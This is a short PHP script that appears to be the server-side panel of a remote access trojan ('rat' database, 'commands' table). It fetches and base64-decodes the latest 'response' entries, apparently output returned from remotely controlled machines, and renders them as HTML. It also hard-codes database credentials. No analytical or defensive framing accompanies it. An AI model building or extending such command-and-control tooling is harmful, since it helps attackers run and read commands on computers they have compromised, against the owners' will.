<?php

mysql_connect("localhost", "nzbkpavw_rat", "pq97r") or die(mysql_error());
mysql_select_db("nzbkpavw_rat") or die(mysql_error());

$result = mysql_query("SELECT response FROM commands WHERE response != '' ORDER BY ID DESC LIMIT 10");
$echo = "";
while ($data = mysql_fetch_array($result)) {
	$response = base64_decode($data['response']);
	
	//Fix backslashes
	$response= str_replace("\\\\", "#$*BACKSLASH*$#", $response);
	$response = str_replace("\\", "", $response);
	$response = str_replace("#$*BACKSLASH*$#", "\\", $response);
	
	//Parse html
	$response = str_replace(">", "&gt;", $response);
	$response = str_replace("<", "&lt;", $response);
	$response = str_replace("#&gt;#", ">", $response);
	$response = str_replace("#&lt;#", "<", $response);
	
	//Fix newlines
	$response = str_replace("\r", "", $response);
	$response = str_replace("\t", "", $response);
	$response = str_replace("\n", "<br>", $response);

	$echo = $response.$echo;
}

echo $echo;
?>